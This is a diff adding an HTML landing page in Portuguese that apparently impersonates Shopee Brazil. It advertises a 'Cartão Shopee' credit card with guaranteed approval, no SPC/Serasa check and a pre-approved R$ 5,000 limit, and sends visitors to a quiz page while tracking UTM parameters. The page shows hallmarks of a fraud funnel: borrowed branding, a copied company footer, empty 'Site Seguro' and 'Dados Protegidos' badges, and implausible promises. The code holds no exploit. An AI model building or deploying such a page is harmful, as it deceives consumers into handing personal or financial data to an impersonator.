@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+
+<head>
+
+    <!-- Armazena utm em local storage -->
+    <script>
+        function storeUTMParams() {
+            const params = new URLSearchParams(window.location.search);
+            const utmParams = {};
+
+            // Armazena apenas os parâmetros UTM
+            params.forEach((value, key) => {
+                if (key.startsWith('utm_')) {
+                    utmParams[key] = value;
+                }
+            });
+
+            // Salva os parâmetros UTM em uma chave específica no localStorage
+            localStorage.setItem('utmParams', JSON.stringify(utmParams));
+
+            // Exibe no console o que foi armazenado no localStorage
+            console.log('Parâmetros UTM armazenados no localStorage:', utmParams);
+        }
+
+        window.onload = function () {
+            storeUTMParams();
+        };
+    </script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="https://deo.shopeemobile.com/shopee/shopee-mobilemall-live-sg/assets/icon_favicon_1_32.0Wecxv.png">
+    <title>Cartão Shopee - Solicite sem consulta ao SPC</title>
+    <link href="../cdn.jsdelivr.net/npm/remixicon%404.6.0/fonts/remixicon.min.css" rel="stylesheet">
+    <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-subids
+    async
+    defer
+    ></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            overflow-x: hidden;
+            background: #f6f6f6;
+        }
+
+        .header {
+            background: #EE4D2D;
+            padding: 1rem 0;
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            width: 160px;
+            height: auto;
+        }
+
+        .hero {
+            background: linear-gradient(135deg, #EE4D2D 0%, #FF6B4B 100%);
+            color: white;
+            padding: 3rem 1rem;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero h1 {
+            font-size: clamp(1.8rem, 5vw, 2.5rem);
+            font-weight: 700;
+            margin-bottom: 1rem;
+            line-height: 1.2;
+        }
+
+        .hero p {
+            font-size: clamp(1rem, 3vw, 1.25rem);
+            margin-bottom: 2rem;
+            opacity: 0.9;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .highlight-badge {
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px);
+            padding: 0.75rem 1.5rem;
+            border-radius: 50px;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 1.5rem;
+            font-size: 1rem;
+            font-weight: 500;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .highlight-badge i {
+            color: #FFD700;
+        }
+
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin: 2rem 0;
+            flex-wrap: wrap;
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: rgba(255, 255, 255, 0.9);
+            color: #EE4D2D;
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+            font-size: 0.875rem;
+            font-weight: 500;
+        }
+
+        .cta-button {
+            background: white;
+            color: #EE4D2D;
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 1.1rem;
+            text-decoration: none;
+            display: inline-block;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.2);
+            background: #fafafa;
+        }
+
+        .steps-section {
+            padding: 4rem 1rem;
+            background: white;
+            text-align: center;
+        }
+
+        .steps-title {
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: #111827;
+            margin-bottom: 3rem;
+        }
+
+        .steps-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2rem;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 1rem;
+        }
+
+        .step-card {
+            text-align: center;
+            padding: 2rem;
+            border-radius: 16px;
+            background: #f8f9fa;
+            position: relative;
+            border: 1px solid #f0f0f0;
+        }
+
+        .step-number {
+            background: #EE4D2D;
+            color: white;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            position: absolute;
+            top: -16px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .step-icon {
+            font-size: 2rem;
+            color: #EE4D2D;
+            margin-bottom: 1rem;
+        }
+
+        .step-title {
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            color: #111827;
+        }
+
+        .step-description {
+            color: #6b7280;
+            font-size: 0.875rem;
+            line-height: 1.5;
+        }
+
+        .benefits {
+            padding: 4rem 1rem;
+            background: #f6f6f6;
+        }
+
+        .benefits-grid {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1.5rem;
+            padding: 2rem 1rem;
+        }
+
+        .benefit-card {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 16px;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+            transition: all 0.3s ease;
+            border: 1px solid #f0f0f0;
+        }
+
+        .benefit-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
+            border-color: #EE4D2D;
+        }
+
+        .benefit-icon {
+            font-size: 2rem;
+            color: #EE4D2D;
+            margin-bottom: 1rem;
+            display: inline-block;
+            padding: 1rem;
+            background: #FFF5F3;
+            border-radius: 12px;
+        }
+
+        .benefit-title {
+            font-size: 1.125rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            color: #111827;
+        }
+
+        .benefit-description {
+            color: #6b7280;
+            line-height: 1.6;
+            font-size: 0.875rem;
+        }
+
+        .footer {
+            background: #1a1a1a;
+            color: #f5f5f5;
+            text-align: center;
+            padding: 2rem 1rem;
+            border-bottom: solid 3px #EE4D2D;
+            font-size: 0.875rem;
+        }
+
+        @media (max-width: 768px) {
+            .benefits-grid {
+                grid-template-columns: 1fr;
+                padding: 1rem 0;
+            }
+
+            .security-badges {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .security-badge {
+                width: 100%;
+                justify-content: center;
+            }
+
+            .hero {
+                padding: 2rem 1rem;
+            }
+
+            .cta-button {
+                width: 90%;
+                text-align: center;
+            }
+
+            .steps-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header class="header">
+        <img src="images/logo.png" alt="Shopee Logo" class="logo">
+    </header>
+
+    <section class="hero">
+        <div class="highlight-badge">
+            <i class="ri-shield-check-line"></i>
+            Sem consulta ao SPC/Serasa
+        </div>
+
+        <h2>Cartão Shopee com limite<br>pré-aprovado de até R$ 5.000</h2><br>
+        <p>Processo 100% digital, sem burocracia e sem precisar sair de casa</p>
+
+        <div class="security-badges">
+            <div class="security-badge">
+                <i class="ri-shield-check-line"></i>
+                Site Seguro
+            </div>
+            <div class="security-badge">
+                <i class="ri-lock-line"></i>
+                Dados Protegidos
+            </div>
+            <div class="security-badge">
+                <i class="ri-bank-card-line"></i>
+                Aprovação Garantida
+            </div>
+        </div>
+
+        <a class="cta-button" href="quiz/index.html">QUERO SOLICITAR MEU CARTÃO</a>
+    </section>
+
+    <section class="steps-section">
+        <h2 class="steps-title">Como funciona?</h2>
+        <div class="steps-grid">
+            <div class="step-card">
+                <div class="step-number">1</div>
+                <i class="ri-questionnaire-line step-icon"></i>
+                <h3 class="step-title">Responda o Quiz</h3>
+                <p class="step-description">Apenas 4 perguntas rápidas para analisarmos seu perfil</p>
+            </div>
+
+            <div class="step-card">
+                <div class="step-number">2</div>
+                <i class="ri-timer-flash-line step-icon"></i>
+                <h3 class="step-title">Análise Instantânea</h3>
+                <p class="step-description">Resultado em segundos, sem consulta ao SPC/Serasa</p>
+            </div>
+
+            <div class="step-card">
+                <div class="step-number">3</div>
+                <i class="ri-bank-card-line step-icon"></i>
+                <h3 class="step-title">Receba seu Cartão</h3>
+                <p class="step-description">Cartão virtual na hora e físico em até 7 dias úteis</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="benefits">
+        <div class="benefits-grid">
+            <div class="benefit-card">
+                <i class="ri-money-dollar-circle-line benefit-icon"></i>
+                <h3 class="benefit-title">Zero Anuidade</h3>
+                <p class="benefit-description">Economize mais de R$ 500 por ano em anuidades</p>
+            </div>
+
+            <div class="benefit-card">
+                <i class="ri-bank-card-line benefit-icon"></i>
+                <h3 class="benefit-title">Limite Flexível</h3>
+                <p class="benefit-description">Aumente seu limite conforme usa o cartão</p>
+            </div>
+
+            <div class="benefit-card">
+                <i class="ri-gift-line benefit-icon"></i>
+                <h3 class="benefit-title">Cashback Garantido</h3>
+                <p class="benefit-description">Receba até 5% de volta em todas as suas compras</p>
+            </div>
+
+            <div class="benefit-card">
+                <i class="ri-shield-star-line benefit-icon"></i>
+                <h3 class="benefit-title">Benefícios Exclusivos</h3>
+                <p class="benefit-description">Descontos especiais em lojas parceiras</p>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        2025 Shopee Brasil. CNPJ: 35.635.824/0001-12<br>
+        Av. das Nações Unidas, 3003 - Bonfim, Osasco - SP, 06233-903
+    </footer>
+
+</body>
+
+</html>
